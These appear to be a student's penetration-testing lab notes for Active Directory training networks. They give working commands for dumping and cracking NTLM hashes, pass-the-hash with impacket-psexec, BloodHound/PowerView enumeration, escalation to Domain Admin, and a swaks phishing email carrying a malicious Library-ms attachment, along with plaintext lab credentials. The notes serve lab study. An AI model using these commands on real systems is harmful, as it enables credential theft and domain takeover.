
Underneath the line is what I thought was the way into PE technique but did not pan out. This is how it worked. I uploaded mimikatz (new version) to ensure this would work. Go to commands are below.
![[Pasted image 20230907092524.png]]
- After gaining the Hash NTLM (what I need), I tried cracking through the following command: hashcat -m 1000 nelly.hash
/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
- Did not work, so I used impacket-psexec to pass the hash on to the .82 for system level access
- ![[Pasted image 20230907092851.png]]
- In order to do this, I needed to fill the LM hash with 32 0's, following the NT hash of the Admin.
_______________________________________________________________
- RDP'd into Yoshi's Machine with the creds of Mushroom!
- I immediately dropped in powerview and sharphound to do AD enumeration.
- After running sharphound.exe -d medtech.com --CollectionMethods All, I used PSUpload to transfer it back to my machine for further analysis
- ![[Pasted image 20230906171242.png]]
- Looking at this, I need to enumerate Yoshi's memberships to see if he is 1) a part of the "account operators" group or 2) if I can elevate my privileges to put Yoshi into that group. The generic all link shows me I can leverage myself into the Domain Admin's group with Leon (who is the DA in this network).
- ![[Pasted image 20230906172912.png]]
- PowerView was disabled so ran this command to hopefully run this![[Pasted image 20230906202311.png]]
- Username -> Leon
- Password -> rabbit:)
- python3 psexec.py medtech.com/leon:"rabbit:)"@172.16.235.83
- 1605  python3 psexec.py RELIA/jim:Castello1
 1607  python3 psexec.py RELIA/dmzadmin:'SlimGodhoodMope'@192.168.189.189
 1608  python3 psexec.py RELIA/dmzadmin:SlimGodhoodMope@192.168.189.189
 1616  python3 psexec.py RELIA/jim:'Castello1!'@192.168.189.191
 1617  python3 psexec.py RELIA/jim:'Castello1!'@192.168.189.189
 sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.189.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ![[Pasted image 20231112165340.png]]
 ****

